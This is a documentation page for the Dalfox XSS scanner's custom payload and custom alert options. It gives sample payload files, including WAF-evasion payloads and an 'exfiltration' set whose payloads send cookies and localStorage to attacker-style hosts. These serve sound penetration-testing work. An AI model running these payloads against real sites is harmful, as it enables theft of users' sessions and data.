---
title: Custom Payload/Alert
redirect_from: /docs/custom-payload/
nav_order: 1
parent: Features
toc: true
layout: page
---

# Custom Payload and Custom Alert

## Overview

Dalfox provides powerful options to customize both the XSS payloads used during scanning and the alert mechanisms triggered upon successful exploitation. These customization features are particularly valuable when:

- Testing against applications with specific XSS filters or WAFs
- Verifying vulnerabilities in environments where standard payloads fail
- Creating targeted proof-of-concept demonstrations
- Executing specialized JavaScript functions during XSS verification
- Evading detection by security tools that look for common XSS patterns

## Custom Payloads

The custom payload feature allows you to provide your own list of XSS payloads that Dalfox will use during testing, either alongside or instead of the built-in payloads.

### Using Custom Payload Files

Create a text file containing your custom payloads, with one payload per line:

**Example `my-payloads.txt`:**
```
<img src=x onerror=confirm(document.domain)>
<svg onload=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>
<script>fetch('https://attacker.com/c='+document.cookie)</script>
```

Then use the file with the `--custom-payload` flag:

```bash
dalfox url https://example.com/search?q=test --custom-payload my-payloads.txt
```

### Only Using Custom Payloads

If you want Dalfox to use only your custom payloads and skip the built-in ones, add the `--only-custom-payload` flag:

```bash
dalfox url https://example.com/search?q=test --custom-payload my-payloads.txt --only-custom-payload
```

This is particularly useful when:
- You need to test with a very specific set of payloads
- You want to reduce scanning time
- You're testing against a known framework with specific vulnerabilities

### Payload Templating

Your custom payloads can include special placeholder values that Dalfox will replace during testing:

- `{{title}}` - Replaced with "Dalfox"
- `{{version}}` - Replaced with the current Dalfox version

Example payload using placeholders:
```
<script>alert('XSS found by {{title}} v{{version}}')</script>
```

## Custom Alert Mechanisms

Dalfox allows you to customize the JavaScript function and value used for XSS proof-of-concept verification. This is controlled by two flags:

- `--custom-alert-value`: Changes what value is passed to the alert function
- `--custom-alert-type`: Controls how the value is formatted (string, numeric, etc.)

### Custom Alert Value

By default, Dalfox uses `alert(1)` for XSS verification. You can change the value inside the alert:

```bash
# Use alert(1337) instead of alert(1)
dalfox url https://example.com/search?q=test --custom-alert-value 1337

# Execute more complex JavaScript
dalfox url https://example.com/search?q=test --custom-alert-value "document.domain"
```

### Alert Types

The `--custom-alert-type` flag controls how the value is formatted:

| Type | Description | Example Result |
|------|-------------|---------------|
| `none` (default) | Use the value directly | `alert(1337)`, `alert(document.cookie)` |
| `str` | Wrap value in quotes | `alert("1337")`, `alert('document.cookie')` |
| `int` | Ensure value is treated as integer | `alert(1337)` |

You can specify multiple types to have Dalfox test with different formats:

```bash
# Test with both string and numeric formats
dalfox url https://example.com/search?q=test --custom-alert-value 1337 --custom-alert-type "str,int"
```

### Examples with Different Alert Types

#### Default (No Custom Alert)

```bash
dalfox url http://vulnerable-site.com/page?param=test
```

Generated payloads will use the default `alert(1)`:
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
```

#### Custom Alert Value (No Type Specified)

```bash
dalfox url http://vulnerable-site.com/page?param=test --custom-alert-value document.cookie
```

Generated payloads:
```html
<script>alert(document.cookie)</script>
<img src=x onerror=alert(document.cookie)>
```

#### Custom Alert Value with String Type

```bash
dalfox url http://vulnerable-site.com/page?param=test --custom-alert-value XSS --custom-alert-type str
```

Generated payloads:
```html
<script>alert("XSS")</script>
<img src=x onerror=alert('XSS')>
```

#### Multiple Alert Types

```bash
dalfox url http://vulnerable-site.com/page?param=test --custom-alert-value 1337 --custom-alert-type str,none
```

Both formats will be tested:
```html
<script>alert("1337")</script>
<script>alert(1337)</script>
```

## Advanced Use Cases

### WAF Bypass Example

Create a custom payload file with WAF evasion techniques:

**waf-bypass.txt:**
```
<img src=x onerror=\u0061\u006C\u0065\u0072\u0074(1)>
<iframe src="javascript:&#97&#108&#101&#114&#116(1)"></iframe>
<script>eval('\u0061\u006c\u0065\u0072\u0074(1)')</script>
```

Run the scan with these payloads:
```bash
dalfox url https://waf-protected-site.com/search --custom-payload waf-bypass.txt
```

### Data Exfiltration Example

Create payloads that send data to your server:

**exfiltration.txt:**
```
<img src=x onerror="fetch('https://your-server.com/log?cookie='+document.cookie)">
<script>navigator.sendBeacon('https://your-server.com/log', JSON.stringify(localStorage))</script>
<svg onload="(new Image).src='https://your-server.com/log?'+document.cookie">
```

Run with your exfiltration payloads:
```bash
dalfox url https://target-site.com --custom-payload exfiltration.txt
```

### DOM Exploration 

Custom payloads to explore DOM properties:

**dom-explore.txt:**
```
<img src=x onerror="alert(Object.keys(window))">
<script>alert(document.documentElement.innerHTML.substring(0,500))</script>
```

Combined with custom alert type:
```bash
dalfox url https://target-site.com --custom-payload dom-explore.txt --custom-alert-type none
```

## Best Practices

1. **Start Small**: Begin with a few custom payloads to test their effectiveness
2. **Test Variations**: Create multiple variations of the same payload to bypass different filters
3. **Use Context-Specific Payloads**: Create separate payload files for different contexts (HTML, JS, attribute, etc.)
4. **Document Your Payloads**: Add comments in your payload files to remember their purpose
5. **Combine with Other Features**: Use custom payloads with other Dalfox features like blind XSS for best results
